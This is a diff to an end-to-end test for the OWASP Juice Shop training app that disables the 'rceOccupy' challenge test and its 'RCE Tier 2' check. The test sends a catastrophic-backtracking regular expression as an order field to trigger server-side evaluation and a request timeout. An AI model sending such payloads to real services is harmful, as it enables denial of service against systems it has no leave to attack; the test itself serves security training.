@@ -15,13 +15,13 @@ describe('/b2b/v2/order', () => {
   })
 
   describe('challenge "rceOccupy"', () => {
-    it('should be possible to cause request timeout using a recursive regular expression payload', () => {
+    xit('should be possible to cause request timeout using a recursive regular expression payload', () => {
       browser.ignoreSynchronization = true
       browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/b2b/v2/orders\', {orderLinesData: \'/((a+)+)b/.test("aaaaaaaaaaaaaaaaaaaaaaaaaaaaa")\'});')
       browser.driver.sleep(4000) // 2sec for the deserialization timeout plus 2sec for Angular
       browser.ignoreSynchronization = false
     })
 
-    protractor.expect.challengeSolved({challenge: 'RCE Tier 2'})
+    // protractor.expect.challengeSolved({challenge: 'RCE Tier 2'})
   })
 })
